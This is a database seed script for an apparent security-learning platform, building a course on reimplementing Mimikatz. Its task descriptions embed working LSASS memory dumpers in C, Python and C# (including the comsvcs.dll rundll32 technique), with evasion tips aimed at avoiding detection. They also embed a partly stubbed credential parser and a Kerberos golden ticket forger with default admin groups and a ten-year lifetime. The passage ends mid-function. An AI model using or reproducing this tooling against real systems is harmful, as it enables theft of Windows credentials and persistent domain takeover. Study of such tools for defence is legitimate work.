#!/usr/bin/env npx tsx
/**
 * Seed: Mimikatz & Credential Tools Reimplementation
 * Complete reimplementation of Windows credential attack tools
 */

import Database from 'better-sqlite3';
import { join } from 'path';

const db = new Database(join(process.cwd(), 'data', 'quest-log.db'));
const now = Date.now();

const insertPath = db.prepare(`
	INSERT INTO paths (name, description, color, language, difficulty, estimated_weeks, skills, created_at)
	VALUES (?, ?, ?, ?, ?, ?, ?, ?)
`);

const insertModule = db.prepare(`
	INSERT INTO modules (path_id, name, description, order_index, created_at)
	VALUES (?, ?, ?, ?, ?)
`);

const insertTask = db.prepare(`
	INSERT INTO tasks (module_id, title, description, details, order_index, created_at)
	VALUES (?, ?, ?, ?, ?, ?)
`);

// ============================================================================
// MIMIKATZ REIMPLEMENTATION
// ============================================================================
const mimikatzPath = insertPath.run(
	'Reimplement: Mimikatz',
	'Complete reimplementation of Mimikatz credential extraction tool. Learn Windows security internals, LSASS memory parsing, credential extraction, and Kerberos ticket manipulation.',
	'red',
	'C+Python+C#',
	'advanced',
	16,
	'Windows internals, LSASS, credentials, Kerberos, DPAPI, SAM, LSA secrets',
	now
);

// Module 1: LSASS Memory Extraction
const mimMod1 = insertModule.run(mimikatzPath.lastInsertRowid, 'LSASS Memory Extraction', 'Extract and parse LSASS process memory', 0, now);

insertTask.run(mimMod1.lastInsertRowid, 'Build LSASS Memory Dumper', 'Create a tool to dump the LSASS process memory using MiniDumpWriteDump or direct memory reading with debug privileges, enabling offline credential extraction while avoiding real-time detection', `## LSASS Memory Dumper

### Overview
Create a tool to dump LSASS process memory using multiple techniques to avoid detection.

### C Implementation - MiniDumpWriteDump Method
\`\`\`c
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")

DWORD GetLsassPid() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return pid;
}

BOOL EnableDebugPrivilege() {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return FALSE;

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(token);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(token, FALSE, &tp,
        sizeof(tp), NULL, NULL);
    CloseHandle(token);

    return result && GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}

BOOL DumpLsass(const wchar_t* outputPath) {
    if (!EnableDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege\\n");
        return FALSE;
    }

    DWORD lsassPid = GetLsassPid();
    if (!lsassPid) {
        printf("[-] Failed to find LSASS PID\\n");
        return FALSE;
    }
    printf("[+] Found LSASS PID: %lu\\n", lsassPid);

    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, lsassPid);
    if (!hProcess) {
        printf("[-] Failed to open LSASS: %lu\\n", GetLastError());
        return FALSE;
    }

    HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        printf("[-] Failed to create output file\\n");
        return FALSE;
    }

    // Use MiniDumpWriteDump
    BOOL result = MiniDumpWriteDump(
        hProcess,
        lsassPid,
        hFile,
        MiniDumpWithFullMemory,
        NULL, NULL, NULL);

    CloseHandle(hFile);
    CloseHandle(hProcess);

    if (result) {
        printf("[+] LSASS dumped successfully\\n");
    } else {
        printf("[-] MiniDumpWriteDump failed: %lu\\n", GetLastError());
    }

    return result;
}

// Alternative: Direct memory read without MiniDump
typedef struct _MEMORY_REGION {
    PVOID BaseAddress;
    SIZE_T RegionSize;
    PBYTE Data;
} MEMORY_REGION;

BOOL DumpLsassManual(const wchar_t* outputPath) {
    if (!EnableDebugPrivilege()) return FALSE;

    DWORD lsassPid = GetLsassPid();
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, lsassPid);
    if (!hProcess) return FALSE;

    HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    MEMORY_BASIC_INFORMATION mbi;
    PBYTE addr = NULL;

    while (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_READWRITE ||
             mbi.Protect & PAGE_READONLY)) {

            PBYTE buffer = (PBYTE)malloc(mbi.RegionSize);
            SIZE_T bytesRead;

            if (ReadProcessMemory(hProcess, mbi.BaseAddress,
                    buffer, mbi.RegionSize, &bytesRead)) {
                // Write region header
                DWORD written;
                WriteFile(hFile, &mbi.BaseAddress, sizeof(PVOID), &written, NULL);
                WriteFile(hFile, &bytesRead, sizeof(SIZE_T), &written, NULL);
                WriteFile(hFile, buffer, (DWORD)bytesRead, &written, NULL);
            }
            free(buffer);
        }
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        printf("Usage: lsass_dump.exe <output.dmp>\\n");
        return 1;
    }

    return DumpLsass(argv[1]) ? 0 : 1;
}
\`\`\`

### Python Implementation - Using comsvcs.dll
\`\`\`python
#!/usr/bin/env python3
"""
LSASS Dumper using comsvcs.dll rundll32 technique
"""

import ctypes
import subprocess
import os
import sys
from ctypes import wintypes

# Enable SeDebugPrivilege
def enable_debug_privilege():
    """Enable SeDebugPrivilege for current process"""

    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_QUERY = 0x0008
    SE_PRIVILEGE_ENABLED = 0x00000002

    class LUID(ctypes.Structure):
        _fields_ = [
            ("LowPart", wintypes.DWORD),
            ("HighPart", wintypes.LONG)
        ]

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ("Luid", LUID),
            ("Attributes", wintypes.DWORD)
        ]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [
            ("PrivilegeCount", wintypes.DWORD),
            ("Privileges", LUID_AND_ATTRIBUTES * 1)
        ]

    advapi32 = ctypes.windll.advapi32
    kernel32 = ctypes.windll.kernel32

    # Get current process token
    token = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(
        kernel32.GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        ctypes.byref(token)
    ):
        return False

    # Lookup privilege LUID
    luid = LUID()
    if not advapi32.LookupPrivilegeValueW(
        None,
        "SeDebugPrivilege",
        ctypes.byref(luid)
    ):
        kernel32.CloseHandle(token)
        return False

    # Enable privilege
    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

    result = advapi32.AdjustTokenPrivileges(
        token, False,
        ctypes.byref(tp),
        ctypes.sizeof(tp),
        None, None
    )

    kernel32.CloseHandle(token)
    return result and kernel32.GetLastError() == 0


def get_lsass_pid():
    """Find LSASS process ID"""
    import psutil

    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'lsass.exe':
            return proc.info['pid']
    return None


def dump_lsass_comsvcs(output_path):
    """
    Dump LSASS using comsvcs.dll MiniDump export
    rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <pid> <path> full
    """

    pid = get_lsass_pid()
    if not pid:
        print("[-] Could not find LSASS")
        return False

    print(f"[+] Found LSASS PID: {pid}")

    # comsvcs.dll method
    cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} {output_path} full'

    try:
        # Must run from elevated context
        result = subprocess.run(cmd, shell=True, capture_output=True)

        if os.path.exists(output_path):
            print(f"[+] LSASS dumped to {output_path}")
            return True
        else:
            print("[-] Dump failed")
            return False

    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def dump_lsass_procdump(output_path):
    """Alternative: Use ProcDump (Sysinternals)"""

    pid = get_lsass_pid()
    if not pid:
        return False

    # ProcDump method (must have procdump.exe)
    cmd = f'procdump.exe -accepteula -ma {pid} {output_path}'

    try:
        subprocess.run(cmd, shell=True, check=True)
        return os.path.exists(output_path)
    except:
        return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: lsass_dump.py <output.dmp>")
        sys.exit(1)

    enable_debug_privilege()
    dump_lsass_comsvcs(sys.argv[1])
\`\`\`

### Evasion Techniques
1. **Direct syscalls** - Bypass API hooking
2. **Duplicate handle** - Clone LSASS handle from another process
3. **Silent process exit** - Abuse WerFault.exe
4. **PPL bypass** - Exploit vulnerable drivers

### Detection
- Monitor for LSASS access with PROCESS_VM_READ
- Watch for MiniDumpWriteDump calls
- Alert on suspicious rundll32.exe executions
`, 0, now);

insertTask.run(mimMod1.lastInsertRowid, 'Parse LSASS Memory for Credentials', 'Parse minidump files of the LSASS process to locate and decrypt cached credentials including NTLM hashes, Kerberos tickets, and plaintext passwords by navigating Windows memory structures and cryptographic contexts', `## LSASS Memory Parser

### Overview
Parse LSASS memory dumps to extract credentials, including NTLM hashes, Kerberos tickets, and plaintext passwords.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
LSASS Memory Parser - Extract credentials from minidump
Inspired by pypykatz
"""

import struct
import re
from dataclasses import dataclass
from typing import List, Optional, Dict, Any
from Crypto.Cipher import AES, DES3
from Crypto.Hash import MD4, HMAC, MD5
import hashlib


@dataclass
class Credential:
    username: str
    domain: str
    password: Optional[str] = None
    nt_hash: Optional[str] = None
    lm_hash: Optional[str] = None
    sha1: Optional[str] = None


@dataclass
class KerberosTicket:
    client: str
    server: str
    key_type: int
    key: bytes
    start_time: int
    end_time: int
    ticket: bytes


class LsassParser:
    """Parse LSASS minidump for credentials"""

    # Known signatures for credential structures
    SIGNATURES = {
        'msv1_0': [
            b'\\x33\\xc0\\x8b\\xf8',  # Windows 10
            b'\\x8b\\xc6\\x48\\x8b',  # Windows 10 x64
        ],
        'kerberos': [
            b'\\x48\\x8b\\x05',  # Kerberos key
        ],
        'wdigest': [
            b'\\x48\\x83\\xec\\x20',  # WDigest
        ],
    }

    # Crypto keys for decryption
    LSA_KEYS = {
        'aes_key': None,
        'des_key': None,
        'iv': None,
    }

    def __init__(self, dump_path: str):
        self.dump_path = dump_path
        self.dump_data = None
        self.credentials: List[Credential] = []
        self.tickets: List[KerberosTicket] = []
        self.lsa_keys = {}

    def load_dump(self):
        """Load minidump file"""
        with open(self.dump_path, 'rb') as f:
            self.dump_data = f.read()

        # Verify minidump signature
        if self.dump_data[:4] != b'MDMP':
            raise ValueError("Not a valid minidump file")

        print(f"[+] Loaded dump: {len(self.dump_data)} bytes")

    def find_lsa_keys(self):
        """Locate and decrypt LSA encryption keys"""

        # Search for LSA key patterns
        # These are the decryption keys used by LSASS

        # Pattern for lsasrv!g_pKeyList
        patterns = [
            b'\\x83\\x64\\x24\\x30\\x00\\x48\\x8d\\x45',
            b'\\x83\\x64\\x24\\x30\\x00\\x44\\x8b\\xc6',
        ]

        for pattern in patterns:
            offset = self.dump_data.find(pattern)
            if offset != -1:
                print(f"[+] Found LSA key pattern at 0x{offset:x}")
                # Extract key structure
                # This requires understanding the specific Windows version
                break

    def extract_msv_credentials(self):
        """Extract MSV1_0 (NTLM) credentials"""

        # MSV1_0 LogonSession structure patterns
        # Contains username, domain, NTLM hash

        # Search for MSV credential pattern
        # Structure varies by Windows version

        pattern = re.compile(
            b'(.{0,32}?)' +  # Username
            b'\\x00\\x00' +
            b'(.{0,32}?)' +  # Domain
            b'\\x00\\x00' +
            b'(.{32})'       # NT Hash (16 bytes encrypted)
        )

        # Simplified search - real implementation needs version-specific parsing
        for match in re.finditer(b'\\x00\\x00\\x00.{16}\\x00\\x00', self.dump_data):
            offset = match.start()

            # Try to extract credential structure
            try:
                cred = self._parse_msv_entry(offset)
                if cred:
                    self.credentials.append(cred)
            except:
                continue

    def _parse_msv_entry(self, offset: int) -> Optional[Credential]:
        """Parse MSV1_0 credential entry"""

        data = self.dump_data[offset:offset+512]

        # Extract username length and offset
        username_len = struct.unpack('<H', data[0:2])[0]
        username_max = struct.unpack('<H', data[2:4])[0]

        if username_len > 256 or username_len == 0:
            return None

        # Parse Unicode string
        username_offset = struct.unpack('<I', data[4:8])[0]

        # Decrypt NT hash
        encrypted_hash = data[0x50:0x60]  # Offset varies
        nt_hash = self._decrypt_hash(encrypted_hash)

        return Credential(
            username="parsed_user",
            domain="DOMAIN",
            nt_hash=nt_hash.hex() if nt_hash else None
        )

    def _decrypt_hash(self, encrypted: bytes) -> Optional[bytes]:
        """Decrypt credential using LSA keys"""

        if not self.LSA_KEYS['aes_key']:
            return encrypted  # Return encrypted if no key

        try:
            # AES-256-CFB decryption
            cipher = AES.new(
                self.LSA_KEYS['aes_key'],
                AES.MODE_CFB,
                self.LSA_KEYS['iv']
            )
            return cipher.decrypt(encrypted)
        except:
            return None

    def extract_kerberos_tickets(self):
        """Extract Kerberos tickets from memory"""

        # Search for Kerberos ticket cache
        # KerbGlobalLogonSessionTable pattern

        ticket_pattern = b'\\x76\\x82'  # ASN.1 sequence for ticket

        offset = 0
        while True:
            offset = self.dump_data.find(ticket_pattern, offset)
            if offset == -1:
                break

            try:
                ticket = self._parse_kerberos_ticket(offset)
                if ticket:
                    self.tickets.append(ticket)
            except:
                pass

            offset += 1

    def _parse_kerberos_ticket(self, offset: int) -> Optional[KerberosTicket]:
        """Parse Kerberos ticket structure"""

        data = self.dump_data[offset:offset+4096]

        # Parse ASN.1 DER encoded ticket
        # Real implementation would use pyasn1

        return None  # Placeholder

    def extract_wdigest(self):
        """Extract WDigest plaintext passwords"""

        # WDigest stores plaintext passwords (if enabled)
        # Search for l_LogSessList

        # Pattern for WDigest credential list
        pattern = b'\\x48\\x8b\\x1d'  # mov rbx, [rip+...]

        offset = self.dump_data.find(pattern)
        if offset != -1:
            print(f"[+] Found WDigest at 0x{offset:x}")
            # Parse WDigest credentials

    def extract_tspkg(self):
        """Extract TsPkg (RDP) credentials"""

        # TsPkg stores credentials for SSO
        # Similar structure to WDigest
        pass

    def extract_ssp(self):
        """Extract SSP credentials"""
        pass

    def extract_livessp(self):
        """Extract LiveSSP (Microsoft Account) credentials"""
        pass

    def run(self):
        """Run full credential extraction"""

        self.load_dump()
        self.find_lsa_keys()

        print("[*] Extracting MSV credentials...")
        self.extract_msv_credentials()

        print("[*] Extracting Kerberos tickets...")
        self.extract_kerberos_tickets()

        print("[*] Extracting WDigest...")
        self.extract_wdigest()

        print(f"\\n[+] Found {len(self.credentials)} credentials")
        print(f"[+] Found {len(self.tickets)} Kerberos tickets")

        return self.credentials, self.tickets


def main():
    import sys

    if len(sys.argv) < 2:
        print("Usage: lsass_parser.py <dump.dmp>")
        sys.exit(1)

    parser = LsassParser(sys.argv[1])
    creds, tickets = parser.run()

    print("\\n=== Credentials ===")
    for cred in creds:
        print(f"  {cred.domain}\\\\{cred.username}")
        if cred.nt_hash:
            print(f"    NT: {cred.nt_hash}")
        if cred.password:
            print(f"    Password: {cred.password}")

    print("\\n=== Kerberos Tickets ===")
    for ticket in tickets:
        print(f"  {ticket.client} -> {ticket.server}")


if __name__ == "__main__":
    main()
\`\`\`

### Key Structures to Parse
1. **MSV1_0** - NTLM hashes
2. **Kerberos** - Tickets and session keys
3. **WDigest** - Plaintext passwords
4. **TsPkg** - RDP credentials
5. **LiveSSP** - Microsoft account creds
`, 1, now);

insertTask.run(mimMod1.lastInsertRowid, 'Implement sekurlsa Module', 'Replicate Mimikatz sekurlsa functionality to extract credentials from multiple Windows authentication packages including MSV1_0, Kerberos, WDigest, LiveSSP, and TsPkg using pattern matching and decryption routines', `## sekurlsa Module Implementation

### Overview
Implement the sekurlsa module for live credential extraction from LSASS.

### C# Implementation
\`\`\`csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Principal;
using System.Collections.Generic;

namespace Mimikatz
{
    public class Sekurlsa
    {
        // P/Invoke declarations
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            uint dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int dwSize,
            out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(
            IntPtr TokenHandle,
            bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            int BufferLength,
            IntPtr PreviousState,
            IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid);

        const uint PROCESS_VM_READ = 0x0010;
        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint TOKEN_QUERY = 0x0008;
        const uint SE_PRIVILEGE_ENABLED = 0x00000002;

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        public class LogonSession
        {
            public string Username { get; set; }
            public string Domain { get; set; }
            public string LogonServer { get; set; }
            public DateTime LogonTime { get; set; }
            public string NtHash { get; set; }
            public string LmHash { get; set; }
            public string Password { get; set; }
            public List<KerberosTicket> Tickets { get; set; } = new();
        }

        public class KerberosTicket
        {
            public string ServiceName { get; set; }
            public string ClientName { get; set; }
            public DateTime StartTime { get; set; }
            public DateTime EndTime { get; set; }
            public byte[] TicketData { get; set; }
            public byte[] SessionKey { get; set; }
        }

        private IntPtr _lsassHandle;
        private byte[] _lsassMemory;

        public bool EnableDebugPrivilege()
        {
            IntPtr tokenHandle;
            if (!OpenProcessToken(
                Process.GetCurrentProcess().Handle,
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                out tokenHandle))
            {
                return false;
            }

            LUID luid;
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
            {
                CloseHandle(tokenHandle);
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = new LUID_AND_ATTRIBUTES
                {
                    Luid = luid,
                    Attributes = SE_PRIVILEGE_ENABLED
                }
            };

            bool result = AdjustTokenPrivileges(
                tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);

            CloseHandle(tokenHandle);
            return result && Marshal.GetLastWin32Error() == 0;
        }

        public int GetLsassPid()
        {
            foreach (var proc in Process.GetProcessesByName("lsass"))
            {
                return proc.Id;
            }
            return 0;
        }

        public bool OpenLsass()
        {
            if (!EnableDebugPrivilege())
            {
                Console.WriteLine("[-] Failed to enable SeDebugPrivilege");
                return false;
            }

            int pid = GetLsassPid();
            if (pid == 0)
            {
                Console.WriteLine("[-] LSASS not found");
                return false;
            }

            _lsassHandle = OpenProcess(
                PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                false, pid);

            if (_lsassHandle == IntPtr.Zero)
            {
                Console.WriteLine($"[-] Failed to open LSASS: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"[+] Opened LSASS (PID: {pid})");
            return true;
        }

        public byte[] ReadMemory(IntPtr address, int size)
        {
            byte[] buffer = new byte[size];
            int bytesRead;

            if (!ReadProcessMemory(_lsassHandle, address, buffer, size, out bytesRead))
            {
                return null;
            }

            return buffer;
        }

        public List<LogonSession> LogonPasswords()
        {
            var sessions = new List<LogonSession>();

            if (!OpenLsass())
                return sessions;

            // Find lsasrv.dll base in LSASS
            // Parse LogonSessionList
            // Extract credentials from each provider

            Console.WriteLine("\\n=== MSV1_0 Credentials ===");
            var msvCreds = ExtractMsv();
            sessions.AddRange(msvCreds);

            Console.WriteLine("\\n=== Kerberos Credentials ===");
            var kerbCreds = ExtractKerberos();
            sessions.AddRange(kerbCreds);

            Console.WriteLine("\\n=== WDigest Credentials ===");
            var wdigestCreds = ExtractWdigest();
            sessions.AddRange(wdigestCreds);

            CloseHandle(_lsassHandle);
            return sessions;
        }

        private List<LogonSession> ExtractMsv()
        {
            var sessions = new List<LogonSession>();

            // Find MSV1_0 provider
            // Parse credential structures
            // Decrypt NTLM hashes

            // Placeholder - real implementation requires
            // version-specific offsets

            return sessions;
        }

        private List<LogonSession> ExtractKerberos()
        {
            var sessions = new List<LogonSession>();

            // Find Kerberos provider
            // Parse ticket cache
            // Extract tickets and keys

            return sessions;
        }

        private List<LogonSession> ExtractWdigest()
        {
            var sessions = new List<LogonSession>();

            // Find WDigest provider
            // Parse credential list
            // Decrypt passwords

            return sessions;
        }

        public void DisplayResults(List<LogonSession> sessions)
        {
            foreach (var session in sessions)
            {
                Console.WriteLine($"\\nUsername: {session.Domain}\\\\{session.Username}");
                Console.WriteLine($"Logon Server: {session.LogonServer}");
                Console.WriteLine($"Logon Time: {session.LogonTime}");

                if (!string.IsNullOrEmpty(session.NtHash))
                    Console.WriteLine($"NT Hash: {session.NtHash}");

                if (!string.IsNullOrEmpty(session.Password))
                    Console.WriteLine($"Password: {session.Password}");

                foreach (var ticket in session.Tickets)
                {
                    Console.WriteLine($"  Ticket: {ticket.ServiceName}");
                }
            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("\\n=== Mimikatz sekurlsa::logonpasswords ===\\n");

            var sek = new Sekurlsa();
            var sessions = sek.LogonPasswords();
            sek.DisplayResults(sessions);
        }
    }
}
\`\`\`

### Key Features
- Live LSASS memory reading
- Multi-provider support (MSV, Kerberos, WDigest, TsPkg)
- Credential decryption
- Kerberos ticket extraction
`, 2, now);

// Module 2: Kerberos Attacks
const mimMod2 = insertModule.run(mimikatzPath.lastInsertRowid, 'Kerberos Ticket Manipulation', 'Golden/Silver tickets and pass-the-ticket', 1, now);

insertTask.run(mimMod2.lastInsertRowid, 'Build Golden Ticket Generator', 'Forge Kerberos Ticket-Granting Tickets (TGTs) using the KRBTGT account hash, enabling domain-wide authentication bypass and persistence by creating tickets for any user with arbitrary group memberships and extended validity periods', `## Golden Ticket Generator

### Overview
Forge Kerberos TGT tickets using the KRBTGT hash for domain persistence.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
Golden Ticket Generator
Forge TGT tickets using KRBTGT hash
"""

import struct
import datetime
import os
from Crypto.Cipher import AES, DES3
from Crypto.Hash import HMAC, MD4, MD5
import hashlib
from typing import Optional
from pyasn1.type import univ, char, useful, tag
from pyasn1.codec.der import encoder, decoder


class EncryptionKey:
    """Kerberos encryption key"""

    # Encryption types
    ETYPE_AES256_CTS = 18
    ETYPE_AES128_CTS = 17
    ETYPE_RC4_HMAC = 23
    ETYPE_DES_CBC_MD5 = 3

    def __init__(self, key: bytes, etype: int):
        self.key = key
        self.etype = etype

    @classmethod
    def from_nt_hash(cls, nt_hash: bytes) -> 'EncryptionKey':
        """Create RC4-HMAC key from NT hash"""
        return cls(nt_hash, cls.ETYPE_RC4_HMAC)

    @classmethod
    def from_aes_key(cls, key: bytes) -> 'EncryptionKey':
        """Create AES-256 key"""
        return cls(key, cls.ETYPE_AES256_CTS)

    def encrypt(self, plaintext: bytes, usage: int) -> bytes:
        """Encrypt data with appropriate algorithm"""

        if self.etype == self.ETYPE_RC4_HMAC:
            return self._encrypt_rc4(plaintext, usage)
        elif self.etype == self.ETYPE_AES256_CTS:
            return self._encrypt_aes256(plaintext, usage)
        else:
            raise ValueError(f"Unsupported etype: {self.etype}")

    def _encrypt_rc4(self, plaintext: bytes, usage: int) -> bytes:
        """RC4-HMAC encryption"""

        # Key derivation
        k1 = HMAC.new(self.key, struct.pack('<I', usage), MD5).digest()

        # Generate checksum
        confounder = os.urandom(8)
        data = confounder + plaintext
        checksum = HMAC.new(k1, data, MD5).digest()

        # Derive encryption key
        k2 = HMAC.new(k1, checksum, MD5).digest()

        # RC4 encrypt
        from Crypto.Cipher import ARC4
        cipher = ARC4.new(k2)
        ciphertext = cipher.encrypt(data)

        return checksum + ciphertext

    def _encrypt_aes256(self, plaintext: bytes, usage: int) -> bytes:
        """AES-256-CTS encryption"""

        # Derive key
        ki = self._derive_key(usage, b'kerberos')
        ke = self._derive_key(usage, b'')

        # Add confounder
        confounder = os.urandom(16)
        data = confounder + plaintext

        # Pad to block size
        padlen = 16 - (len(data) % 16)
        data += bytes([padlen] * padlen)

        # AES-CBC encrypt
        iv = bytes(16)
        cipher = AES.new(ke, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(data)

        # HMAC
        hmac = HMAC.new(ki, ciphertext, hashlib.sha1).digest()[:12]

        return ciphertext + hmac

    def _derive_key(self, usage: int, label: bytes) -> bytes:
        """Derive key for AES"""
        # Simplified - real implementation uses PRF+
        return hashlib.sha256(self.key + struct.pack('<I', usage) + label).digest()


class GoldenTicket:
    """Generate Golden Ticket (forged TGT)"""

    def __init__(
        self,
        domain: str,
        domain_sid: str,
        krbtgt_key: EncryptionKey,
        user: str,
        user_id: int = 500,
        groups: list = None
    ):
        self.domain = domain.upper()
        self.domain_sid = domain_sid
        self.krbtgt_key = krbtgt_key
        self.user = user
        self.user_id = user_id
        self.groups = groups or [512, 513, 518, 519, 520]  # Default admin groups

    def generate(self, lifetime_hours: int = 10*365*24) -> bytes:
        """Generate forged TGT"""

        now = datetime.datetime.utcnow()
        auth_time = now
        start_time = now
        end_time = now + datetime.timedelta(hours=lifetime_hours)
        renew_till = end_time

        # Build PAC
        pac = self._build_pac(auth_time)

        # Build EncTicketPart
        enc_ticket_part = self._build_enc_ticket_part(
            auth_time, start_time, end_time, renew_till, pac
        )

        # Encrypt ticket
        encrypted_ticket = self.krbtgt_key.encrypt(enc_ticket_part, 2)

        # Build Ticket
        ticket = self._build_ticket(encrypted_ticket)

        # Build EncKDCRepPart
        session_key = os.urandom(32)
        enc_kdc_rep = self._build_enc_kdc_rep(
            session_key, start_time, end_time, renew_till
        )

        # Build AS-REP
        as_rep = self._build_as_rep(ticket, enc_kdc_rep)

        return as_rep

    def _build_pac(self, auth_time: datetime.datetime) -> bytes:
        """Build Privilege Attribute Certificate"""

        # PAC_LOGON_INFO
        logon_info = self._build_pac_logon_info(auth_time)

        # PAC_CLIENT_INFO
        client_info = self._build_pac_client_info(auth_time)

        # PAC_SERVER_CHECKSUM
        server_checksum = bytes(20)  # Placeholder

        # PAC_PRIVSVR_CHECKSUM
        kdc_checksum = bytes(20)  # Placeholder

        # Assemble PAC
        pac_buffers = [
            (0x00000001, logon_info),      # LOGON_INFO
            (0x0000000A, client_info),     # CLIENT_INFO
            (0x00000006, server_checksum), # SERVER_CHECKSUM
            (0x00000007, kdc_checksum),    # PRIVSVR_CHECKSUM
        ]

        # Calculate total size
        header_size = 8 + len(pac_buffers) * 16
        offset = header_size

        pac_data = struct.pack('<II', len(pac_buffers), 0)  # cBuffers, Version

        for buf_type, buf_data in pac_buffers:
            padded_len = (len(buf_data) + 7) & ~7
            pac_data += struct.pack('<IIQQ',
                buf_type, len(buf_data), offset, 0)
            offset += padded_len

        for _, buf_data in pac_buffers:
            padded_len = (len(buf_data) + 7) & ~7
            pac_data += buf_data + bytes(padded_len - len(buf_data))

        return pac_data

    def _build_pac_logon_info(self, auth_time: datetime.datetime) -> bytes:
        """Build KERB_VALIDATION_INFO structure"""

        # Simplified - real implementation needs NDR encoding
        info = b''

        # LogonTime, etc
        filetime = self._datetime_to_filetime(auth_time)
        info += struct.pack('<Q', filetime)  # LogonTime
        info += struct.pack('<Q', 0)          # LogoffTime
        info += struct.pack('<Q', 0)          # KickOffTime
        info += struct.pack('<Q', filetime)   # PasswordLastSet
        info += struct.pack('<Q', 0)          # PasswordCanChange
        info += struct.pack('<Q', 0x7FFFFFFFFFFFFFFF)  # PasswordMustChange

        # Account info
        info += self._encode_rpc_unicode(self.user)
        info += self._encode_rpc_unicode(self.user)  # FullName
        info += self._encode_rpc_unicode('')          # LogonScript
        info += self._encode_rpc_unicode('')          # ProfilePath
        info += self._encode_rpc_unicode('')          # HomeDirectory
        info += self._encode_rpc_unicode('')          # HomeDrive

        # Session info
        info += struct.pack('<HH', 0, 0)  # LogonCount, BadPasswordCount
        info += struct.pack('<I', self.user_id)  # UserId
        info += struct.pack('<I', 513)     # PrimaryGroupId

        # Groups
        info += struct.pack('<I', len(self.groups))
        for gid in self.groups:
